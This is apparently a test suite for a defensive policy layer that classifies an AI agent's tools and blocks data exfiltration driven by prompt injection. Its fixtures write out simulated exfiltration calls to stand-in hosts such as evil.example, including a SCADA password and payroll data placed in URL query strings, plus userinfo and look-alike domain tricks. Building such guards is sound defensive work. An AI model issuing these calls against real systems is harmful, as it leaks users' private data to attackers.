import { describe, it, expect } from 'vitest'
import { classifyTool, analyzeToolset, suggestFix } from '../src/domain/classify'
import { decide, emptyTaint, normalizeDestination, extractDestinations, type Taint } from '../src/domain/policy'

function taintWith(flags: Partial<Pick<Taint, 'privateSeen' | 'untrustedSeen'>>, ...privateTexts: string[]): Taint {
  const t = { ...emptyTaint(), ...flags }
  privateTexts.forEach((x) => t.secrets.add(x))
  return t
}

const inbox = { name: 'read_inbox', description: 'Read the latest emails in the user mailbox', params: ['limit'] }
const send = { name: 'send_email', description: 'Send an email to a recipient', params: ['to', 'subject', 'body'] }
const fetchUrl = { name: 'fetch_url', description: 'Fetch a web page by URL and return its text', params: ['url'] }
const readDoc = { name: 'read_document', description: 'Read a document from the user drive', params: ['path'] }

describe('AC1 classifyTool', () => {
  it('send_email is outbound only', () => {
    const c = classifyTool(send)
    expect([...c.legs].sort()).toEqual(['outbound'])
    expect(c.evidence.outbound.length).toBeGreaterThan(0)
  })
  it('read_inbox is private + untrusted', () => {
    expect([...classifyTool(inbox).legs].sort()).toEqual(['private', 'untrusted'])
  })
  it('fetch_url is untrusted + outbound', () => {
    expect([...classifyTool(fetchUrl).legs].sort()).toEqual(['outbound', 'untrusted'])
  })
  it('read_document is private only', () => {
    expect([...classifyTool(readDoc).legs].sort()).toEqual(['private'])
  })
  it('camelCase names are split', () => {
    expect(classifyTool({ name: 'postSlackMessage', description: '', params: ['channel', 'text'] }).legs.has('outbound')).toBe(true)
  })
})

describe('trifecta + AC6 fix', () => {
  it('inbox + send is a trifecta', () => {
    expect(analyzeToolset([inbox, send]).trifecta).toBe(true)
  })
  it('read_document + send is not', () => {
    expect(analyzeToolset([readDoc, send]).trifecta).toBe(false)
  })
  it('fix names the leg with fewest providers', () => {
    const fix = suggestFix([inbox, send, readDoc])
    // private: inbox, readDoc (2) · untrusted: inbox (1) · outbound: send (1) → tie → prefer outbound
    expect(fix?.leg).toBe('outbound')
    expect(fix?.tools).toEqual(['send_email'])
  })
  it('no fix needed when not a trifecta', () => {
    expect(suggestFix([readDoc, send])).toBeNull()
  })
})

describe('destinations', () => {
  it('normalises emails and hosts', () => {
    expect(normalizeDestination('Bob@Town.GOV')).toEqual({ kind: 'email', value: 'bob@town.gov', host: 'town.gov' })
    expect(normalizeDestination('https://www.Evil.example/c?d=1')).toEqual({ kind: 'host', value: 'evil.example', host: 'evil.example', url: 'https://evil.example/c?d=1' })
  })
  it('extracts from known keys and from free strings', () => {
    const d = extractDestinations({ to: ['a@x.org', 'b@y.org'], body: 'hi' })
    expect(d.map((x) => x.value)).toEqual(['a@x.org', 'b@y.org'])
    const u = extractDestinations({ q: 'see https://evil.example/x' })
    expect(u.map((x) => x.value)).toEqual(['evil.example'])
  })
})

const instruction = 'Summarise my inbox and email it to bob@town.gov'

describe('AC2 provenance rule', () => {
  const taint = taintWith({ privateSeen: true, untrustedSeen: true })
  it('blocks a destination that came from content once private data was read (R2)', () => {
    const d = decide({ tool: send, args: { to: 'eve@evil.example', body: 'x' } }, { instruction, allowlist: [], taint })
    expect(d.action).toBe('block')
    expect(d.rule).toBe('R2')
  })
  it('allows the user-named destination (R1)', () => {
    const d = decide({ tool: send, args: { to: 'bob@town.gov', body: 'x' } }, { instruction, allowlist: [], taint })
    expect(d.action).toBe('allow')
    expect(d.rule).toBe('R1')
  })
  it('blocks when any one of several recipients is from content', () => {
    const d = decide({ tool: send, args: { to: ['bob@town.gov', 'eve@evil.example'] } }, { instruction, allowlist: [], taint })
    expect(d.action).toBe('block')
  })
  it('non-outbound tools are always allowed', () => {
    expect(decide({ tool: inbox, args: {} }, { instruction, allowlist: [], taint }).action).toBe('allow')
  })
  it('outbound with no recognisable destination is blocked after a private read', () => {
    const post = { name: 'post_message', description: 'Post a message', params: ['text'] }
    expect(decide({ tool: post, args: { text: 'hello' } }, { instruction, allowlist: [], taint }).action).toBe('block')
  })
})

describe('AC3/AC4 URL exfiltration', () => {
  it('blocks http GET to a content host after a private read, R4 when the secret is in the URL', () => {
    const taint = taintWith({ privateSeen: true, untrustedSeen: true }, 'Water plant SCADA password: Tr0ut-Lake-2291')
    const d = decide({ tool: fetchUrl, args: { url: 'https://evil.example/c?d=Tr0ut-Lake-2291' } }, { instruction, allowlist: [], taint })
    expect(d.action).toBe('block')
    expect(d.rule).toBe('R4')
  })
  it('allows following a web link when nothing private was read (R3)', () => {
    const taint = taintWith({ untrustedSeen: true })
    const d = decide({ tool: fetchUrl, args: { url: 'https://docs.example.org/page' } }, { instruction: 'Read https://news.example.com and summarise', allowlist: [], taint })
    expect(d.action).toBe('allow')
    expect(d.rule).toBe('R3')
  })
  it('a bare host the user named is trusted for that host only, without a query string', () => {
    const taint = taintWith({ privateSeen: true })
    const ctx = { instruction: 'check data.maplefalls.gov for the permit list', allowlist: [], taint }
    expect(decide({ tool: fetchUrl, args: { url: 'https://data.maplefalls.gov/permits' } }, ctx).action).toBe('allow')
    expect(decide({ tool: send, args: { to: 'x@x.data.maplefalls.gov', body: 'hi' } }, ctx).action).toBe('block')
    // a link the agent built itself (not copied from content) goes to the user
    expect(decide({ tool: fetchUrl, args: { url: 'https://x.data.maplefalls.gov/permits' } }, ctx).action).toBe('block')
    expect(decide({ tool: fetchUrl, args: { url: 'https://data.maplefalls.gov/permits?d=1' } }, ctx).action).toBe('block')
  })
})

describe('AC5 allowlist', () => {
  it('wildcard domain allowlist makes an address user provenance', () => {
    const taint = taintWith({ privateSeen: true })
    const d = decide({ tool: send, args: { to: 'clerk@town.gov' } }, { instruction: 'file the report', allowlist: ['*.town.gov', 'town.gov'], taint })
    expect(d.action).toBe('allow')
  })
  it('allowlist does not match look-alike domains', () => {
    const taint = taintWith({ privateSeen: true })
    const d = decide({ tool: send, args: { to: 'clerk@town.gov.evil.example' } }, { instruction: 'file the report', allowlist: ['town.gov'], taint })
    expect(d.action).toBe('block')
  })
  it('instruction mention must be a whole address/host, not a substring', () => {
    const taint = taintWith({ privateSeen: true })
    const d = decide({ tool: send, args: { to: 'ob@town.gov' } }, { instruction, allowlist: [], taint })
    expect(d.action).toBe('block')
  })
})

describe('bypass hardening (mock-review round)', () => {
  const post = { name: 'post_message', description: 'Post a message to a team chat channel', params: ['channel', 'text'] }
  const taint = taintWith({ privateSeen: true }, 'payroll: J. Rivera,4471,58200')
  it('an ordinary word from the request is not a user-named channel', () => {
    const d = decide({ tool: post, args: { channel: 'inbox', text: 'x' } }, { instruction: 'Summarize my inbox and post it to #council', allowlist: [], taint })
    expect(d.action).toBe('block')
  })
  it('#name and "name channel" in the request are user-named', () => {
    expect(decide({ tool: post, args: { channel: '#council', text: 'x' } }, { instruction: 'post it to #council', allowlist: [], taint }).action).toBe('allow')
    expect(decide({ tool: post, args: { channel: 'council', text: 'x' } }, { instruction: 'post it in the council channel', allowlist: [], taint }).action).toBe('allow')
  })
  it('private text in a new URL on a user-named shared host is still blocked (R4)', () => {
    const d = decide({ tool: fetchUrl, args: { url: 'https://github.com/attacker/x?d=Rivera,4471,58200' } }, { instruction: 'check github.com for the release notes', allowlist: [], taint })
    expect(d.action).toBe('block')
  })
  it('the exact URL the user wrote stays allowed', () => {
    const d = decide({ tool: fetchUrl, args: { url: 'https://github.com/org/repo/releases' } }, { instruction: 'open https://github.com/org/repo/releases', allowlist: [], taint })
    expect(d.action).toBe('allow')
  })
  it('userinfo tricks resolve to the real host', () => {
    const d = decide({ tool: fetchUrl, args: { url: 'https://town.gov@evil.example/x' } }, { instruction: 'see town.gov', allowlist: [], taint })
    expect(d.action).toBe('block')
  })
})

describe('organisation directory', () => {
  const post = { name: 'send_channel_message', description: 'Send a message to a channel', params: ['channel', 'body'] }
  it("'#*' trusts every channel and member of the organisation's own chat workspace, not outside e-mails or links", () => {
    const taint = taintWith({ privateSeen: true }, 'payroll: J. Rivera,4471,58200')
    const ctx = { instruction: 'post a hello to the channel with most users', allowlist: ['#*'], taint }
    expect(decide({ tool: post, args: { channel: 'External_0', body: 'hello' } }, ctx).action).toBe('allow')
    expect(decide({ tool: post, args: { channel: 'random', body: 'see https://evil.example/x?d=1' } }, ctx).action).toBe('block')
  })
})
